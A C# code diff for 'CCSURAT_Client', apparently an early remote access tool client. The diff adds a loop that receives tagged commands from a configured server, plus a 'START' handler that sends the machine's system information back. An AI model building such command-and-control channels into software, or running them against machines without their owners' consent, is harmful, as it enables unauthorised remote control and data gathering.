@@ -12,8 +12,8 @@ namespace CCSURAT_Client
         // Store main form to print to its console.
         private ClientMainForm mainForm;
 
-        TcpClient client;
-        NetworkStream netStream;
+        private TcpClient client;
+        private NetworkStream netStream;
 
         private string status;
         private Boolean isConnected;
@@ -23,12 +23,11 @@ namespace CCSURAT_Client
             this.mainForm = form;
             this.serverIP = IP;
             this.serverPort = port;
-            this.isConnected = false;
             SetStatus("Disconnected.");
-            ConnectToServer();
         }
 
-        private void ConnectToServer()
+        // NEED TO MAKE THIS METHOD RE-RUN AFTER CONNECTION LOSS
+        public void Start()
         {
             // Attempt TCP listener connection to server.
             SetStatus("Attempting connection.");
@@ -70,9 +69,10 @@ namespace CCSURAT_Client
                     int i;
                     if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
                     {
-                        //bytes to text
+                        // convert data bytes to string
                         data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                         Log("Command recieved: " + data);
+                        HandleData(data);
                     }
                     System.Threading.Thread.Sleep(1);
                 }
@@ -81,6 +81,39 @@ namespace CCSURAT_Client
             {
                 Log("Error recieving command: " + ex.ToString());
             }
+        }
+
+        private void HandleData(string data)
+        {
+            try {
+                string command = GetCommand(data);
+                data = RemoveCommand(data);
+                switch (command)
+                {
+                    case "START":
+                        Write("[[START]]" + SystemUtils.SystemInfo() + "[[/START]]");
+                        break;
+
+                }
+            } catch(Exception ex)
+            {
+                Log("Could not handle data: " + data);
+            }
+        }
+
+        // Gets command tag
+        private string GetCommand(string text)
+        {
+            text = text.Substring(2, text.IndexOf("]") - 2);
+            return text;
+        }
+
+        // Removes command tag from data
+        private string RemoveCommand(string data)
+        {
+            data = data.Substring(data.IndexOf("]]") + 2);
+            data = data.Substring(0, data.LastIndexOf("[") - 1);
+            return data;
         }
 
         // write data to server
